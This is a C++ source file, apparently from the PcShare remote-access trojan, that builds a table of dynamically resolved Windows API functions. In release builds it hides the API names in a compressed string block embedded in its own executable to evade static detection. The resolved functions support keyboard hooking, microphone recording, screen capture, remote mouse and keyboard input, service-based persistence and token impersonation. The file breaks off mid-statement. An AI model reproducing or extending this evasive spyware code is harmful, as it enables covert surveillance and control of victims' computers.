#include "stdafx.h"
#include "MyFunc.h"
#include "Lzw.h"


CMyFunc::CMyFunc()
{
	hModule_Kernel32 = NULL;
	hModule_Psapi = NULL;
	hModule_Shell32 = NULL;
	hModule_MSVCRT = NULL;
	hModule_User32 = NULL;
	hModule_Ole32 = NULL;
	hModule_ADVAPI32 = NULL;
	hModule_IMM32 = NULL;
	hModule_wininet = NULL;
	hModule_Shlwapi = NULL;
	HMODULE hModule_Winmm = NULL;
	hModule_Gdiplus = NULL;
	hModule_Wtsapi32 = NULL;
	hModule_Userenv = NULL;
	hModule_Gdi32 = NULL;

	pModuleString = NULL;
	nModuleStringLen = 0;
}

CMyFunc::~CMyFunc()
{
	if(hModule_Kernel32 != NULL)
	{
		FreeLibrary(hModule_Kernel32);
	}
	if(hModule_Psapi != NULL)
	{
		FreeLibrary(hModule_Psapi);
	}
	if(hModule_Shell32 != NULL)
	{
		FreeLibrary(hModule_Shell32);
	}
	if(hModule_MSVCRT != NULL)
	{
		FreeLibrary(hModule_MSVCRT);
	}
	if(hModule_User32 != NULL)
	{
		FreeLibrary(hModule_User32);
	}
	if(hModule_Ole32 != NULL)
	{
		FreeLibrary(hModule_Ole32);
	}
	if(hModule_ADVAPI32 != NULL)
	{
		FreeLibrary(hModule_ADVAPI32);
	}
	if(hModule_IMM32 != NULL)
	{
		FreeLibrary(hModule_IMM32);
	}
	if(hModule_wininet != NULL)
	{
		FreeLibrary(hModule_wininet);
	}
	if(hModule_Shlwapi != NULL)
	{
		FreeLibrary(hModule_Shlwapi);
	}
	if(hModule_Winmm != NULL)
	{
		FreeLibrary(hModule_Winmm);
	}
	if(hModule_Gdiplus != NULL)
	{
		FreeLibrary(hModule_Gdiplus);
	}
	if(hModule_Wtsapi32 != NULL)
	{
		FreeLibrary(hModule_Wtsapi32);
	}
	if(hModule_Userenv != NULL)
	{
		FreeLibrary(hModule_Userenv);
	}
	if(hModule_Gdi32 != NULL)
	{
		FreeLibrary(hModule_Gdi32);
	}

	if(pModuleString != NULL)
	{
		delete [] pModuleString;
	}
}

int inline CMyFunc::GetMySprintf(int nValue, char* pOutStr)
{
	for(int i = 4; i >= 0; i--)
	{
		pOutStr[i] = 0x30 + nValue % 10;
		nValue = nValue / 10;
	}
	return i;
}

inline BOOL CMyFunc::DoMyMemCmp(char* pSrc, char* pDes, int len)
{
	for(int i = 0; i < len; i++)
	{
		if(pSrc[i] != pDes[i])
		{
			return FALSE;
		}
	}
	return TRUE;
}

inline void  CMyFunc::DoMyMemCpy(char* pSrc, char* pDes, int len)
{
	for(int i = 0; i < len; i++)
	{
		pSrc[i] = pDes[i];
	}
}

inline void CMyFunc::GetMyString(DWORD nIndex, char* pOutString, char* pInString, DWORD nInStringLen)
{
	//查看
	if(pInString == NULL || nInStringLen == 0 || nIndex < 10001 || nIndex > 19999)
	{
		_asm int 3;
		return;
	}
	
	char m_FindStr[256] = {0};
	m_FindStr[0] = 'P';
	m_FindStr[1] = 'S';
	m_FindStr[2] = '_';
	GetMySprintf(nIndex, m_FindStr + 3);
	m_FindStr[8] = '=';
	
	for(DWORD i = 0; i < nInStringLen; i++)
	{
		if(DoMyMemCmp(&pInString[i], m_FindStr, 9))
		{
			//找到开始
			char* pStart = &pInString[i] + 9;
			for(i = 0; i < nInStringLen - i - 9; i++)
			{
				if(pStart[i] == '\r')
				{
					DoMyMemCpy(pOutString, pStart, i);
					pOutString[i] = 0;
					return;
				}
			}
		}
	}

	_asm int 3;
}

BOOL CMyFunc::LoadMyData(BYTE* pModuel)
{
	if(pModuleString != NULL)
	{
		return TRUE;
	}

#ifdef _DEBUG
	
	char m_ModuleFileName[256] = {0};
	::GetModuleFileName(m_ghInstance, m_ModuleFileName, 255);
	::CharLower(m_ModuleFileName);
	char* pFind = ::strstr(m_ModuleFileName, "\\bin\\update\\");
	if(pFind != NULL)
	{
		*pFind = 0;
	}
	else
	{
		return FALSE;
	}
	::strcat(m_ModuleFileName, "\\pcshare\\res\\StringDll.ini");

	HANDLE hFile = ::CreateFile(
		m_ModuleFileName,  
		GENERIC_READ,   
		FILE_SHARE_READ, 
		NULL,           
		OPEN_EXISTING,      
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	nModuleStringLen = ::GetFileSize(hFile, NULL);
	DWORD nReadLen = 0;
	pModuleString = new char[nModuleStringLen + 1];
	pModuleString[nModuleStringLen] = 0;
	::ReadFile(hFile, pModuleString, nModuleStringLen, &nReadLen, NULL);
	::CloseHandle(hFile);

#else
	// PE头偏移
	DWORD dwPE_Header_OffSet = *(DWORD *)(pModuel + 0x3C);
	
	// 取得 PE 头
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pModuel + dwPE_Header_OffSet);

	//取字串资源偏移量
	LPPSSAVEFILEINFO pSaveFileInfo = NULL;
	BYTE* pTmpData = pModuel;
	for(DWORD i = 0; i < pPE_Header->OptionalHeader.SizeOfImage - sizeof(ULONGLONG); i++)
	{
		if(*((ULONGLONG*) &pTmpData[i]) == PS_FIND_FLAG)
		{	
			pSaveFileInfo = (LPPSSAVEFILEINFO) &pTmpData[i];
			break;
		}
	}
	if(pSaveFileInfo == NULL)
	{
		return FALSE;
	}

	BYTE* pTmpStr = NULL;

	//开辟字串存储缓冲
	FCLzw lzw;
	lzw.PcUnZip(((BYTE*) pSaveFileInfo) + sizeof(PSSAVEFILEINFO), &pTmpStr, &nModuleStringLen);
	pModuleString = (char*) pTmpStr;

#endif
	
	//开始赋值函数指针
	char m_MyString[512] = {0};

//Gdi32.dll
	GetMyString(10178, m_MyString, pModuleString, nModuleStringLen);
	hModule_Gdi32 = LoadLibrary(m_MyString);
	
	//DeleteDC
	GetMyString(10179, m_MyString, pModuleString, nModuleStringLen);
	DeleteDC = (MyDeleteDC) GetProcAddress(hModule_Gdi32, m_MyString);

	//DeleteObject
	GetMyString(10181, m_MyString, pModuleString, nModuleStringLen);
	DeleteObject = (MyDeleteObject) GetProcAddress(hModule_Gdi32, m_MyString);

	//BitBlt
	GetMyString(10182, m_MyString, pModuleString, nModuleStringLen);
	BitBlt = (MyBitBlt) GetProcAddress(hModule_Gdi32, m_MyString);

	//CreateCompatibleDC
	GetMyString(10183, m_MyString, pModuleString, nModuleStringLen);
	CreateCompatibleDC = (MyCreateCompatibleDC) GetProcAddress(hModule_Gdi32, m_MyString);

	//SelectObject
	GetMyString(10184, m_MyString, pModuleString, nModuleStringLen);
	SelectObject = (MySelectObject) GetProcAddress(hModule_Gdi32, m_MyString);

	//GetDeviceCaps
	GetMyString(10185, m_MyString, pModuleString, nModuleStringLen);
	GetDeviceCaps = (MyGetDeviceCaps) GetProcAddress(hModule_Gdi32, m_MyString);

	//GetDIBits
	GetMyString(10186, m_MyString, pModuleString, nModuleStringLen);
	GetDIBits = (MyGetDIBits) GetProcAddress(hModule_Gdi32, m_MyString);

	//CreateDCA
	GetMyString(10180, m_MyString, pModuleString, nModuleStringLen);
	CreateDC = (MyCreateDCA) GetProcAddress(hModule_Gdi32, m_MyString);

	//CreateCompatibleBitmap
	GetMyString(10187, m_MyString, pModuleString, nModuleStringLen);
	CreateCompatibleBitmap = (MyCreateCompatibleBitmap) GetProcAddress(hModule_Gdi32, m_MyString);

//Userenv.dll
	GetMyString(10166, m_MyString, pModuleString, nModuleStringLen);
	hModule_Userenv = LoadLibrary(m_MyString);

	//CreateEnvironmentBlock
	GetMyString(10167, m_MyString, pModuleString, nModuleStringLen);
	CreateEnvironmentBlock = (MyCreateEnvironmentBlock)	GetProcAddress(hModule_Userenv, m_MyString);

	//DestroyEnvironmentBlock
	GetMyString(10168, m_MyString, pModuleString, nModuleStringLen);
	DestroyEnvironmentBlock = (MyDestroyEnvironmentBlock) GetProcAddress(hModule_Userenv, m_MyString);

//Wtsapi32.dll
	GetMyString(10161, m_MyString, pModuleString, nModuleStringLen);
	hModule_Wtsapi32 = LoadLibrary(m_MyString);

	//WTSSendMessageA
	GetMyString(10162, m_MyString, pModuleString, nModuleStringLen);
	WTSSendMessage = (MyWTSSendMessageA) GetProcAddress(hModule_Wtsapi32, m_MyString);

	//WTSQueryUserToken
	GetMyString(10163, m_MyString, pModuleString, nModuleStringLen);
	WTSQueryUserToken = (MyWTSQueryUserToken) GetProcAddress(hModule_Wtsapi32, m_MyString);

//Ole32.dll
	GetMyString(10155, m_MyString, pModuleString, nModuleStringLen);
	hModule_Ole32 = LoadLibrary(m_MyString);
	
	//CreateStreamOnHGlobal
	GetMyString(10156, m_MyString, pModuleString, nModuleStringLen);
	CreateStreamOnHGlobal = (MyCreateStreamOnHGlobal) GetProcAddress(hModule_Ole32, m_MyString);

	//CoInitializeEx
	GetMyString(10157, m_MyString, pModuleString, nModuleStringLen);
	CoInitializeEx = (MyCoInitializeEx) GetProcAddress(hModule_Ole32, m_MyString);

//Gdiplus.dll
	GetMyString(10153, m_MyString, pModuleString, nModuleStringLen);
	hModule_Gdiplus = LoadLibrary(m_MyString);

	//GdiplusStartup
	GetMyString(10154, m_MyString, pModuleString, nModuleStringLen);
	GdiplusStartup = (MyGdiplusStartup) GetProcAddress(hModule_Gdiplus, m_MyString);
	
//Winmm.dll
	GetMyString(10133, m_MyString, pModuleString, nModuleStringLen);
	hModule_Winmm = LoadLibrary(m_MyString);
	
	//waveInOpen
	GetMyString(10134, m_MyString, pModuleString, nModuleStringLen);
	waveInOpen = (MywaveInOpen) GetProcAddress(hModule_Winmm, m_MyString);

	//waveInClose
	GetMyString(10135, m_MyString, pModuleString, nModuleStringLen);
	waveInClose = (MywaveInClose) GetProcAddress(hModule_Winmm, m_MyString);

	//waveInPrepareHeader
	GetMyString(10136, m_MyString, pModuleString, nModuleStringLen);
	waveInPrepareHeader = (MywaveInPrepareHeader) GetProcAddress(hModule_Winmm, m_MyString);

	//waveInUnprepareHeader
	GetMyString(10137, m_MyString, pModuleString, nModuleStringLen);
	waveInUnprepareHeader = (MywaveInUnprepareHeader) GetProcAddress(hModule_Winmm, m_MyString);

	//waveInAddBuffer
	GetMyString(10138, m_MyString, pModuleString, nModuleStringLen);
	waveInAddBuffer = (MywaveInAddBuffer)	GetProcAddress(hModule_Winmm, m_MyString);

	//waveInStart
	GetMyString(10139, m_MyString, pModuleString, nModuleStringLen);
	waveInStart = (MywaveInStart) GetProcAddress(hModule_Winmm, m_MyString);
	
	//waveInStop
	GetMyString(10140, m_MyString, pModuleString, nModuleStringLen);
	waveInStop = (MywaveInStop) GetProcAddress(hModule_Winmm, m_MyString);

//Shlwapi.dll
	GetMyString(10003, m_MyString, pModuleString, nModuleStringLen);
	hModule_Shlwapi = LoadLibrary(m_MyString);

	//SHDeleteKeyA
	GetMyString(10004, m_MyString, pModuleString, nModuleStringLen);
	SHDeleteKey = (MySHDeleteKeyA) GetProcAddress(hModule_Shlwapi, m_MyString);

//wininet.dll
	GetMyString(10005, m_MyString, pModuleString, nModuleStringLen);
	hModule_wininet = LoadLibrary(m_MyString);

	//InternetOpenA
	GetMyString(10006, m_MyString, pModuleString, nModuleStringLen);
	InternetOpen = (MyInternetOpenA) GetProcAddress(hModule_wininet, m_MyString);

	//InternetOpenUrlA
	GetMyString(10007, m_MyString, pModuleString, nModuleStringLen);
	InternetOpenUrl = (MyInternetOpenUrlA) GetProcAddress(hModule_wininet, m_MyString);

	//InternetCloseHandle
	GetMyString(10008, m_MyString, pModuleString, nModuleStringLen);	
	InternetCloseHandle = (MyInternetCloseHandle) GetProcAddress(hModule_wininet, m_MyString);

	//HttpQueryInfoA
	GetMyString(10009, m_MyString, pModuleString, nModuleStringLen);	
	HttpQueryInfo = (MyHttpQueryInfoA) GetProcAddress(hModule_wininet, m_MyString);

	//InternetReadFile
	GetMyString(10010, m_MyString, pModuleString, nModuleStringLen);	
	InternetReadFile = (MyInternetReadFile) GetProcAddress(hModule_wininet, m_MyString);

//IMM32.dll
	GetMyString(10011, m_MyString, pModuleString, nModuleStringLen);	
	hModule_IMM32 = LoadLibrary(m_MyString);

	//ImmReleaseContext
	GetMyString(10012, m_MyString, pModuleString, nModuleStringLen);
	ImmReleaseContext = (MyImmReleaseContext) GetProcAddress(hModule_IMM32, m_MyString);

	//ImmGetCompositionStringW
	GetMyString(10013, m_MyString, pModuleString, nModuleStringLen);
	ImmGetCompositionStringW = (MyImmGetCompositionStringW) GetProcAddress(hModule_IMM32, m_MyString);

	//ImmGetCompositionStringA
	GetMyString(10014, m_MyString, pModuleString, nModuleStringLen);
	ImmGetCompositionString = (MyImmGetCompositionStringA) GetProcAddress(hModule_IMM32, m_MyString);

	//ImmGetContext
	GetMyString(10015, m_MyString, pModuleString, nModuleStringLen);
	ImmGetContext = (MyImmGetContext) GetProcAddress(hModule_IMM32, m_MyString);

//ADVAPI32.dll
	GetMyString(10016, m_MyString, pModuleString, nModuleStringLen);
	hModule_ADVAPI32 = LoadLibrary(m_MyString);

	//GetUserNameW
	GetMyString(10017, m_MyString, pModuleString, nModuleStringLen);
	GetUserNameW = (MyGetUserNameW) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegCloseKey
	GetMyString(10018, m_MyString, pModuleString, nModuleStringLen);
	RegCloseKey = (MyRegCloseKey) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegOpenKeyExA
	GetMyString(10019, m_MyString, pModuleString, nModuleStringLen);
	RegOpenKeyEx = (MyRegOpenKeyExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegCreateKeyExA
	GetMyString(10020, m_MyString, pModuleString, nModuleStringLen);
	RegCreateKeyEx = (MyRegCreateKeyExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegSetValueExA
	GetMyString(10021, m_MyString, pModuleString, nModuleStringLen);
	RegSetValueEx = (MyRegSetValueExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegDeleteValueA
	GetMyString(10022, m_MyString, pModuleString, nModuleStringLen);
	RegDeleteValue = (MyRegDeleteValueA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegEnumValueA
	GetMyString(10124, m_MyString, pModuleString, nModuleStringLen);
	RegEnumValue = (MyRegEnumValueA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegEnumKeyExA
	GetMyString(10126, m_MyString, pModuleString, nModuleStringLen);
	RegEnumKeyEx = (MyRegEnumKeyExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegQueryValueExA
	GetMyString(10143, m_MyString, pModuleString, nModuleStringLen);
	RegQueryValueEx = (MyRegQueryValueExA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//AdjustTokenPrivileges
	GetMyString(10023, m_MyString, pModuleString, nModuleStringLen);
	AdjustTokenPrivileges = (MyAdjustTokenPrivileges) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//LookupPrivilegeValueA
	GetMyString(10024, m_MyString, pModuleString, nModuleStringLen);
	LookupPrivilegeValue = (MyLookupPrivilegeValueA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//OpenProcessToken
	GetMyString(10025, m_MyString, pModuleString, nModuleStringLen);
	OpenProcessToken = (MyOpenProcessToken) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//StartServiceA
	GetMyString(10026, m_MyString, pModuleString, nModuleStringLen);
	StartService = (MyStartServiceA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//ControlService
	GetMyString(10127, m_MyString, pModuleString, nModuleStringLen);
	ControlService = (MyControlService) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//CloseServiceHandle
	GetMyString(10027, m_MyString, pModuleString, nModuleStringLen);
	CloseServiceHandle = (MyCloseServiceHandle) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//OpenServiceA
	GetMyString(10028, m_MyString, pModuleString, nModuleStringLen);
	OpenService = (MyOpenServiceA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//OpenSCManagerA
	GetMyString(10029, m_MyString, pModuleString, nModuleStringLen);
	OpenSCManager = (MyOpenSCManagerA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//CreateServiceA
	GetMyString(10030, m_MyString, pModuleString, nModuleStringLen);
	CreateService = (MyCreateServiceA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//DeleteService
	GetMyString(10031, m_MyString, pModuleString, nModuleStringLen);
	DeleteService = (MyDeleteService) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//RegisterServiceCtrlHandlerA
	GetMyString(10032, m_MyString, pModuleString, nModuleStringLen);
	RegisterServiceCtrlHandler = (MyRegisterServiceCtrlHandlerA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//SetServiceStatus
	GetMyString(10033, m_MyString, pModuleString, nModuleStringLen);
	SetServiceStatus = (MySetServiceStatus) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//DuplicateTokenEx
	GetMyString(10165, m_MyString, pModuleString, nModuleStringLen);
	DuplicateTokenEx = (MyDuplicateTokenEx) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//CreateProcessAsUserA
	GetMyString(10170, m_MyString, pModuleString, nModuleStringLen);
	CreateProcessAsUser = (MyCreateProcessAsUserA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//ImpersonateSelf
	GetMyString(10171, m_MyString, pModuleString, nModuleStringLen);
	ImpersonateSelf = (MyImpersonateSelf) GetProcAddress(hModule_ADVAPI32, m_MyString);
	
	//OpenThreadToken
	GetMyString(10172, m_MyString, pModuleString, nModuleStringLen);
	OpenThreadToken = (MyOpenThreadToken) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//ChangeServiceConfigA
	GetMyString(10191, m_MyString, pModuleString, nModuleStringLen);
	ChangeServiceConfig = (MyChangeServiceConfigA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//EnumServicesStatusA
	GetMyString(10192, m_MyString, pModuleString, nModuleStringLen);
	EnumServicesStatus = (MyEnumServicesStatusA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//QueryServiceConfigA
	GetMyString(10193, m_MyString, pModuleString, nModuleStringLen);
	QueryServiceConfig = (MyQueryServiceConfigA) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//ChangeServiceConfig2A
	GetMyString(10313, m_MyString, pModuleString, nModuleStringLen);
	ChangeServiceConfig2 = (MyChangeServiceConfig2A) GetProcAddress(hModule_ADVAPI32, m_MyString);

	//QueryServiceConfig2A
	GetMyString(10314, m_MyString, pModuleString, nModuleStringLen);
	QueryServiceConfig2 = (MyQueryServiceConfig2A) GetProcAddress(hModule_ADVAPI32, m_MyString);

//Shell32.dll
	GetMyString(10034, m_MyString, pModuleString, nModuleStringLen);
	hModule_Shell32 = LoadLibrary(m_MyString);

	//ShellExecuteExW
	GetMyString(10035, m_MyString, pModuleString, nModuleStringLen);
	ShellExecuteExW = (MyShellExecuteExW) GetProcAddress(hModule_Shell32, m_MyString);

	//ShellExecuteA
	GetMyString(10036, m_MyString, pModuleString, nModuleStringLen);
	ShellExecute = (MyShellExecuteA) GetProcAddress(hModule_Shell32, m_MyString);

	//SHFileOperationA
	GetMyString(10118, m_MyString, pModuleString, nModuleStringLen);
	SHFileOperationA = (MySHFileOperationA) GetProcAddress(hModule_Shell32, m_MyString);

//User32.dll
	GetMyString(10037, m_MyString, pModuleString, nModuleStringLen);
	hModule_User32 = LoadLibrary(m_MyString);

	//PostThreadMessageA
	GetMyString(10038, m_MyString, pModuleString, nModuleStringLen);
	PostThreadMessage = (MyPostThreadMessageA) GetProcAddress(hModule_User32, m_MyString);

	//wsprintfW
	GetMyString(10039, m_MyString, pModuleString, nModuleStringLen);
	wsprintfW = (MywsprintfW) GetProcAddress(hModule_User32, m_MyString);

	//CharLowerA
	GetMyString(10040, m_MyString, pModuleString, nModuleStringLen);
	CharLower = (MyCharLowerA) GetProcAddress(hModule_User32, m_MyString);

	//GetMessageA
	GetMyString(10041, m_MyString, pModuleString, nModuleStringLen);
	GetMessage = (MyGetMessageA) GetProcAddress(hModule_User32, m_MyString);

	//PostMessageA
	GetMyString(10042, m_MyString, pModuleString, nModuleStringLen);
	PostMessage = (MyPostMessageA) GetProcAddress(hModule_User32, m_MyString);

	//CallNextHookEx
	GetMyString(10043, m_MyString, pModuleString, nModuleStringLen);
	CallNextHookEx = (MyCallNextHookEx) GetProcAddress(hModule_User32, m_MyString);

	//GetForegroundWindow
	GetMyString(10044, m_MyString, pModuleString, nModuleStringLen);
	GetForegroundWindow = (MyGetForegroundWindow) GetProcAddress(hModule_User32, m_MyString);

	//GetWindowTextA
	GetMyString(10045, m_MyString, pModuleString, nModuleStringLen);
	GetWindowText = (MyGetWindowTextA) GetProcAddress(hModule_User32, m_MyString);

	//GetWindowThreadProcessId
	GetMyString(10046, m_MyString, pModuleString, nModuleStringLen);
	GetWindowThreadProcessId = (MyGetWindowThreadProcessId) GetProcAddress(hModule_User32, m_MyString);

	//GetActiveWindow
	GetMyString(10047, m_MyString, pModuleString, nModuleStringLen);
	GetActiveWindow = (MyGetActiveWindow) GetProcAddress(hModule_User32, m_MyString);

	//UnhookWindowsHookEx
	GetMyString(10048, m_MyString, pModuleString, nModuleStringLen);
	UnhookWindowsHookEx = (MyUnhookWindowsHookEx) GetProcAddress(hModule_User32, m_MyString);

	//SetWindowsHookExW
	GetMyString(10049, m_MyString, pModuleString, nModuleStringLen);
	SetWindowsHookExW = (MySetWindowsHookExW) GetProcAddress(hModule_User32, m_MyString);

	//SetThreadDesktop
	GetMyString(10050, m_MyString, pModuleString, nModuleStringLen);
	SetThreadDesktop = (MySetThreadDesktop) GetProcAddress(hModule_User32, m_MyString);

	//OpenDesktopA
	GetMyString(10051, m_MyString, pModuleString, nModuleStringLen);
	OpenDesktop = (MyOpenDesktopA) GetProcAddress(hModule_User32, m_MyString);

	//GetThreadDesktop
	GetMyString(10052, m_MyString, pModuleString, nModuleStringLen);
	GetThreadDesktop = (MyGetThreadDesktop) GetProcAddress(hModule_User32, m_MyString);

	//OpenInputDesktop
	GetMyString(10120, m_MyString, pModuleString, nModuleStringLen);
	OpenInputDesktop = (MyOpenInputDesktop) GetProcAddress(hModule_User32, m_MyString);

	//EnumWindows
	GetMyString(10125, m_MyString, pModuleString, nModuleStringLen);
	EnumWindows = (MyEnumWindows) GetProcAddress(hModule_User32, m_MyString);

	//ShowWindow
	GetMyString(10129, m_MyString, pModuleString, nModuleStringLen);
	ShowWindow = (MyShowWindow) GetProcAddress(hModule_User32, m_MyString);

	//BringWindowToTop
	GetMyString(10130, m_MyString, pModuleString, nModuleStringLen);
	BringWindowToTop = (MyBringWindowToTop) GetProcAddress(hModule_User32, m_MyString);

	//UpdateWindow
	GetMyString(10131, m_MyString, pModuleString, nModuleStringLen);
	UpdateWindow = (MyUpdateWindow)	GetProcAddress(hModule_User32, m_MyString);

	//MessageBoxA
	GetMyString(10132, m_MyString, pModuleString, nModuleStringLen);
	MessageBox = (MyMessageBoxA) GetProcAddress(hModule_User32, m_MyString);

	//OpenWindowStationA
	GetMyString(10158, m_MyString, pModuleString, nModuleStringLen);
	OpenWindowStation = (MyOpenWindowStationA) GetProcAddress(hModule_User32, m_MyString);

	//SetProcessWindowStation
	GetMyString(10159, m_MyString, pModuleString, nModuleStringLen);
	SetProcessWindowStation = (MySetProcessWindowStation) GetProcAddress(hModule_User32, m_MyString);

	//ExitWindowsEx
	GetMyString(10169, m_MyString, pModuleString, nModuleStringLen);
	ExitWindowsEx = (MyExitWindowsEx) GetProcAddress(hModule_User32, m_MyString);

	//SetCursorPos
	GetMyString(10189, m_MyString, pModuleString, nModuleStringLen);
	SetCursorPos = (MySetCursorPos) GetProcAddress(hModule_User32, m_MyString);

	//SendInput
	GetMyString(10190, m_MyString, pModuleString, nModuleStringLen);
	SendInput = (MySendInput) GetProcAddress(hModule_User32, m_MyString);

//Kernel32.dll
	GetMyString(10053, m_MyString, pModuleString, nModuleStringLen);
	hModule_Kernel32 = LoadLibrary(m_MyString);

	//GetModuleHandleA
	GetMyString(10054, m_MyString, pModuleString, nModuleStringLen);
	GetModuleHandle = (MyGetModuleHandleA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetLastError
	GetMyString(10117, m_MyString, pModuleString, nModuleStringLen);
	GetLastError = (MyGetLastError) GetProcAddress(hModule_Kernel32, m_MyString);

	//TerminateProcess
	GetMyString(10128, m_MyString, pModuleString, nModuleStringLen);
	TerminateProcess = (MyTerminateProcess) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateToolhelp32Snapshot
	GetMyString(10121, m_MyString, pModuleString, nModuleStringLen);
	CreateToolhelp32Snapshot = (MyCreateToolhelp32Snapshot) GetProcAddress(hModule_Kernel32, m_MyString);
	
	//Process32First
	GetMyString(10122, m_MyString, pModuleString, nModuleStringLen);
	Process32First = (MyProcess32First)	GetProcAddress(hModule_Kernel32, m_MyString);
	
	//Process32Next
	GetMyString(10123, m_MyString, pModuleString, nModuleStringLen);
	Process32Next = (MyProcess32Next) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetFileSizeEx
	GetMyString(10141, m_MyString, pModuleString, nModuleStringLen);
	GetFileSizeEx = (MyGetFileSizeEx) GetProcAddress(hModule_Kernel32, m_MyString);

	//SetFilePointerEx
	GetMyString(10142, m_MyString, pModuleString, nModuleStringLen);
	SetFilePointerEx = (MySetFilePointerEx) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetStdHandle
	GetMyString(10144, m_MyString, pModuleString, nModuleStringLen);
	GetStdHandle = (MyGetStdHandle) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreatePipe
	GetMyString(10145, m_MyString, pModuleString, nModuleStringLen);
	CreatePipe = (MyCreatePipe) GetProcAddress(hModule_Kernel32, m_MyString);

	//SetStdHandle
	GetMyString(10146, m_MyString, pModuleString, nModuleStringLen);
	SetStdHandle = (MySetStdHandle) GetProcAddress(hModule_Kernel32, m_MyString);

	//DuplicateHandle
	GetMyString(10147, m_MyString, pModuleString, nModuleStringLen);
	DuplicateHandle = (MyDuplicateHandle) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateProcessA
	GetMyString(10148, m_MyString, pModuleString, nModuleStringLen);
	CreateProcess = (MyCreateProcessA) GetProcAddress(hModule_Kernel32, m_MyString);
	
	//GlobalFree
	GetMyString(10149, m_MyString, pModuleString, nModuleStringLen);
	GlobalFree = (MyGlobalFree) GetProcAddress(hModule_Kernel32, m_MyString);

	//GlobalAlloc
	GetMyString(10150, m_MyString, pModuleString, nModuleStringLen);
	GlobalAlloc = (MyGlobalAlloc) GetProcAddress(hModule_Kernel32, m_MyString);

	//GlobalLock
	GetMyString(10151, m_MyString, pModuleString, nModuleStringLen);
	GlobalLock = (MyGlobalLock) GetProcAddress(hModule_Kernel32, m_MyString);

	//ResetEvent
	GetMyString(10152, m_MyString, pModuleString, nModuleStringLen);
	ResetEvent = (MyResetEvent) GetProcAddress(hModule_Kernel32, m_MyString);
	
	//ExitProcess
	GetMyString(10160, m_MyString, pModuleString, nModuleStringLen);
	ExitProcess = (MyExitProcess) GetProcAddress(hModule_Kernel32, m_MyString);

	//WTSGetActiveConsoleSessionId
	GetMyString(10164, m_MyString, pModuleString, nModuleStringLen);
	WTSGetActiveConsoleSessionId = (MyWTSGetActiveConsoleSessionId) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetSystemInfo
	GetMyString(10175, m_MyString, pModuleString, nModuleStringLen);
	GetSystemInfo = (MyGetSystemInfo) GetProcAddress(hModule_Kernel32, m_MyString);

	//GlobalMemoryStatusEx
	GetMyString(10174, m_MyString, pModuleString, nModuleStringLen);
	GlobalMemoryStatusEx = (MyGlobalMemoryStatusEx) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetComputerNameA
	GetMyString(10173, m_MyString, pModuleString, nModuleStringLen);
	GetComputerName = (MyGetComputerNameA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetACP
	GetMyString(10176, m_MyString, pModuleString, nModuleStringLen);
	GetACP = (MyGetACP) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetOEMCP
	GetMyString(10177, m_MyString, pModuleString, nModuleStringLen);
	GetOEMCP = (MyGetOEMCP) GetProcAddress(hModule_Kernel32, m_MyString);

	//SetThreadAffinityMask
	GetMyString(10188, m_MyString, pModuleString, nModuleStringLen);
	SetThreadAffinityMask = (MySetThreadAffinityMask) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetCurrentThread
	GetMyString(10194, m_MyString, pModuleString, nModuleStringLen);
	GetCurrentThread = (MyGetCurrentThread) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetCurrentProcessId
	GetMyString(10119, m_MyString, pModuleString, nModuleStringLen);
	GetCurrentProcessId = (MyGetCurrentProcessId) GetProcAddress(hModule_Kernel32, m_MyString);

	//FindNextFileA
	GetMyString(10112, m_MyString, pModuleString, nModuleStringLen);
	FindNextFile = (MyFindNextFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//FindFirstFileA
	GetMyString(10113, m_MyString, pModuleString, nModuleStringLen);
	FindFirstFile = (MyFindFirstFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//FindClose
	GetMyString(10114, m_MyString, pModuleString, nModuleStringLen);
	FindClose = (MyFindClose) GetProcAddress(hModule_Kernel32, m_MyString);

	//DeviceIoControl
	GetMyString(10055, m_MyString, pModuleString, nModuleStringLen);
	DeviceIoControl = (MyDeviceIoControl) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateMutexA
	GetMyString(10056, m_MyString, pModuleString, nModuleStringLen);
	CreateMutex = (MyCreateMutexA) GetProcAddress(hModule_Kernel32, m_MyString);

	//OpenMutexA
	GetMyString(10057, m_MyString, pModuleString, nModuleStringLen);
